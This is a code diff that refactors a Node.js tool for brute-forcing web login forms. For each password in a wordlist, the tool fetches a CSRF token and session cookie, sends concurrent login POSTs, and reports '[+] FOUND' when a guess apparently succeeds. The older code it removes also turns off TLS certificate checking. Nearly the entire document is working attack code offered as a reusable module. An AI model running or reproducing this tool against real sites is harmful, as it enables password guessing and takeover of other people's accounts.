@@ -5,12 +5,9 @@ var es      = require('event-stream');
 var async   = require('async');
 var request = require('request');
 
-function Attack(config) {
-  
-}
-
+// Launch an attack
 function launch(config) {
-  var queue = async.queue(tryLogin, config.numRequests);
+  var queue = async.queue(tryLogin, config.concurrency);
 
   queue.drain = function() {
     console.log('[+] Finished');
@@ -30,87 +27,68 @@ function launch(config) {
         queue.push(word);
       })
     );
-}
 
-module.exports = Attack;
+  // ==============================================================================================
+  // ==============================================================================================
 
-// ================================================================================================
-// ================================================================================================
+  // Extract CSRF token
+  function getCSRF(callback) {
+    var reqConfig = config.getAdvanced();
 
+    request(reqConfig.csrf, function (error, response, body) {
 
-// Configure the CSRF token request
-var csrfOptions = {
-  url: BASE_URL,
-  method: 'GET',
-  headers: {},
-  rejectUnauthorized: false
+      if (!error && response.statusCode == 200) {
+        var cookieString = response.headers['set-cookie'][0];
+        var capture      = body.match(new RegExp(reqConfig.capture.csrfRegex));
+
+        if (!capture) {
+          console.log('[-] CSRF token not found\n[-] Debug info:\n');
+          process.exit();
+        }
+
+        callback(capture[1], cookieString);
+      }
+    });
+  }
+
+  // Process server response to a login attemot
+  function processLoginResponse(response, body, password) {
+    
+    // If we match known regex password is incorrect
+    var loginFailure = new RegExp(config.getAdvanced().capture.loginRegex);
+
+    if (response.statusCode === 200 && body.match(loginFailure)) { //replace this with a function to macth each regex passed
+      
+      console.log('[-] Invalid: ' + password);
+
+    } else if (response.statusCode < 400) {
+
+      console.log('[+] FOUND: ' + password  + '\n[+] Shutting down....');
+      process.exit();
+    
+    } else {
+      
+      console.log('[-] Server responded with: ' + response.statusCode);
+    
+    }
+  }
+
+  // Attempt to login with given password
+  function tryLogin(password, callback) {
+
+    getCSRF(function(token, cookieString) {
+      var opt = config.getLogin(password, token, cookieString);
+      // Send a login POST
+      request(opt, function (error, response, body) {
+        
+        if (!error) { 
+          processLoginResponse(response, body, password);
+        }
+        
+        callback && callback();
+      });
+    });
+  }
 };
 
-// Define function to extract CSRF token
-function getCSRF(callback) {
-  request(csrfOptions, function (error, response, body) {
-
-    if (!error && response.statusCode == 200) {
-      var cookieString = response.headers['set-cookie'][0];
-      var csrfToken    = body.match(CSRF)[1];
-
-      callback(csrfToken, cookieString);
-    }
-  });
-}
-
-// Configure the login request
-function loginOptions(password, csrfToken, cookieString) {
-  return {
-    url: BASE_URL,
-    method: 'POST',
-    headers: { 
-      Cookie: cookieString 
-    },
-    form: {
-      'authenticity_token': csrfToken,
-      'user[email]': USERNAME,
-      'user[password]': password,
-      'commit': 'Sign+in'
-    },
-    rejectUnauthorized: false
-  };
-}
-
-// Process login response
-function processLoginResponse(response, body, password) {
-
-  // If we match known regex password is incorrect
-  if (response.statusCode === 200 && body.match(ERROR)) {
-    
-    console.log('[-] Invalid: ' + password);
-
-  } else if (response.statusCode < 400) {
-
-    console.log('[+] FOUND: ' + password  + '\n[+] Shutting down....');
-    process.exit();
-  
-  } else {
-    
-    console.log('[-] Server responded with: ' + response.statusCode);
-  
-  }
-}
-
-// Login attempt
-function tryLogin(password, callback) {
-
-  getCSRF(function(token, cookieString) {
-    var opt = loginOptions(password, token, cookieString);
-    
-    // Send a login POST
-    request(opt, function (error, response, body) {
-
-      if (!error) { 
-        processLoginResponse(response, body, password);
-      }
-      
-      callback && callback();
-    });
-  });
-}
+exports.launch = launch;
